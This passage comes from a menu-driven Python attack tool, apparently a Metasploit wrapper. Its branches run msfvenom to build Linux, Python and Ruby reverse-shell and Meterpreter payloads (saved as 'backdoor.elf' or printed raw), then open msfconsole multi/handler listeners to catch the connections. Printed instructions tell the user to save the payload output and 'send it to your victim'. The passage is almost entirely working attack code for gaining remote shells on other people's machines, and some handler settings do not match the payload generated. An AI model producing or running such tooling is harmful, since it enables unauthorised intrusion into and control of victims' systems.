                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -o backdoor.elf".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "linux/x86/meterpreter_reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                       
                elif linx1 == "3":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -o backdoor.elf".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "linux/x86/meterpreter_reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                                   
                elif linx1 == "4":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o backdoor.elf".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "linux/x86/meterpreter_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                       
                elif linx1 == "5":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform linux -f elf -p linux/x64/shell/reverse_tcp LHOST={0} LPORT={1} -o backdoor.elf".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "linux/x64/shell/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                         
                elif linx1 == "6":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -o backdoor.elf".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "linux/x64/meterpreter_reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                       
                elif linx1 == "7":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -o backdoor.elf".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "linux/x64/meterpreter_reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif linx1 == "8":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o backdoor.elf".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "linux/x64/meterpreter_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                       
                else:
                    begining.slowprints1(begining.red + "[!] Wrong choice" + begining.end)
                    begining.slowprints1( begining.white + "[*] Please chose avaiable number" + begining.end)
                    begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                    sleep(2)
                    begining.menu()
                    work.works()
            elif paylo == "6":
                print("""
[1] > python/meterpreter/reverse_tcp
[2] > python/shell_reverse_tcp
[back] > ( Back To Menu )
""")    
                python1 = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST==>"))
                port1 = str(input("LPORT==>"))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if python1 == "1":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform python -f raw -p python/meterpreter/reverse_http LHOST={0} LPORT={1}".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "                 \tPlease make sure to save the output as\n" + begining.end)
                        print(begining.white + "                 \tpy file or you can copy and past the output \n" + begining.end)
                        print(begining.white + "                 \tinto real python script and send it to your victim\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "python/meterpreter/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                             
                elif python1 == "2":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform python -f raw -p python/meterpreter/reverse_https LHOST={0} LPORT={1}".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "                 \tPlease make sure to save the output as\n" + begining.end)
                        print(begining.white + "                 \tpy file or you can copy and past the output \n" + begining.end)
                        print(begining.white + "                 \tinto real python script and send it to your victim\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "python/shell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()    
                elif python1 == "back":
                    begining.menu()
                    work.works()
    
            elif paylo == "7":
                print("""
[1] > ruby/shell_reverse_tcp_ssl
[2] > ruby/shell_reverse_tcp
[3] > ruby/shell_bind_tcp_ipv6
[4] > ruby/shell_bind_tcp
""")
                ruby1 = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST==>"))
                port1 = str(input("LPORT==>"))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if ruby1 == "1":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform ruby -f raw -p ruby/shell_reverse_tcp_ssl LHOST={0} LPORT={1}".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "                 \tPlease make sure to save the output as\n" + begining.end)
                        print(begining.white + "                 \trb file or you can copy and past the output \n" + begining.end)
                        print(begining.white + "                 \tinto real python script and send it to your victim\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "ruby/shell_reverse_tcp_ssl"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                               
                elif ruby1 == "2":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform ruby -f raw -p ruby/shell_reverse_tcp LHOST={0} LPORT={1}".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "                 \tPlease make sure to save the output as\n" + begining.end)
                        print(begining.white + "                 \trb file or you can copy and past the output \n" + begining.end)
                        print(begining.white + "                 \tinto real python script and send it to your victim\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "ruby/shell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                             
                elif ruby1 == "3":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform ruby -f raw -p ruby/shell_bind_tcp_ipv6 LHOST={0} LPORT={1}".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "                 \tPlease make sure to save the output as\n" + begining.end)
                        print(begining.white + "                 \trb file or you can copy and past the output \n" + begining.end)
                        print(begining.white + "                 \tinto real python script and send it to your victim\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "ruby/shell_bind_tcp_ipv6"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                                 
                elif ruby1 == "4":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform ruby -f raw -p ruby/shell_bind_tcp LHOST={0} LPORT={1}".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "                 \tPlease make sure to save the output as\n" + begining.end)
                        print(begining.white + "                 \trb file or you can copy and past the output \n" + begining.end)
                        print(begining.white + "                 \tinto real python script and send it to your victim\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "ruby/shell_bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()        
            elif paylo == "8":
                print("""
[1] > java/meterpreter/reverse_http
[2] > java/meterpreter/reverse_https
[3] > java/meterpreter/reverse_tcp
[4] > java/shell/reverse_tcp
[5] > java/shell_reverse_tcp
[6] > java/meterpreter/bind_tcp
[7] > java/shell/bind_tcp
""")            
                java1 = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST==>"))
                port1 = str(input("LPORT==>"))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)            
                if java1 == "1":
